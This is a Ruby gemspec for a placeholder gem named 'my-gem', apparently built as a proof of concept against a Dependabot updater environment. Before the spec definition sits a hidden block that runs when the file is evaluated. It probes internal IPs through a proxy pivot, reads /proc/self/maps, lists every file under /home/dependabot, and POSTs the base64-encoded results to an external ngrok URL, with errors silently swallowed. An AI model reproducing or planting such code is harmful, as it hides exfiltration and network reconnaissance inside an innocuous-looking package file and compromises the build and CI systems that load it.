COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "resolv"
  require "uri"

  results = []

  # Resolve dependabot-actions.githubapp.com -> IP
  begin
    ip = Resolv.getaddress("dependabot-actions.githubapp.com")
    results << "=== dependabot-actions.githubapp.com resolves to: #{ip} ==="

    # Direct request naar IP (bypasses proxy hostname checks)
    [80, 443, 8080].each do |port|
      begin
        s = TCPSocket.new(ip, port)
        s.write("GET / HTTP/1.0\r\nHost: dependabot-actions.githubapp.com\r\n\r\n")
        s.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [3, 0].pack("l_2"))
        resp = s.recv(2048)
        s.close
        results << "=== DIRECT #{ip}:#{port} ===\n#{resp[0..500]}"
      rescue => e
        results << "=== DIRECT #{ip}:#{port} #{e.class} ==="
      end
    end
  rescue => e
    results << "=== RESOLVE ERR: #{e.class}: #{e.message} ==="
  end

  # Proxy als pivot: raw HTTP naar interne IPs via 172.19.0.2:1080
  # (proxy container heeft mogelijk andere routing dan updater)
  internal_targets = [
    "http://10.0.0.1/",
    "http://10.0.0.2/",
    "http://172.17.0.1/",  # default Docker bridge
    "http://172.18.0.1/",
    "http://172.20.0.1/",
    "http://fd00::1/",
  ]

  internal_targets.each do |target|
    begin
      proxy = TCPSocket.new("172.19.0.2", 1080)
      proxy.write("GET #{target} HTTP/1.0\r\nHost: #{URI(target).host}\r\n\r\n")
      proxy.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [3, 0].pack("l_2"))
      resp = proxy.recv(2048)
      proxy.close
      results << "=== PROXY PIVOT #{target} ===\n#{resp[0..500]}"
    rescue => e
      results << "=== PROXY PIVOT #{target} #{e.class} ==="
    end
  end

  # /proc/self/maps - credential files in memory
  begin
    maps = File.read("/proc/self/maps")
    results << "=== /proc/self/maps ===\n#{maps[0..3000]}"
  rescue => e
    results << "=== /proc/self/maps ERR: #{e.class} ==="
  end

  # Volledige /home/dependabot/ tree
  begin
    tree = []
    Dir.glob("/home/dependabot/**/*", File::FNM_DOTMATCH).each do |f|
      next if f =~ /\/\.\.?$/
      size = File.exist?(f) ? File.size(f) rescue "?" : "-"
      tree << "#{f} (#{size})"
    end
    results << "=== /home/dependabot/ TREE (#{tree.length} entries) ===\n#{tree.join("\n")[0..4000]}"
  rescue => e
    results << "=== TREE ERR: #{e.class} ==="
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=pivot")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
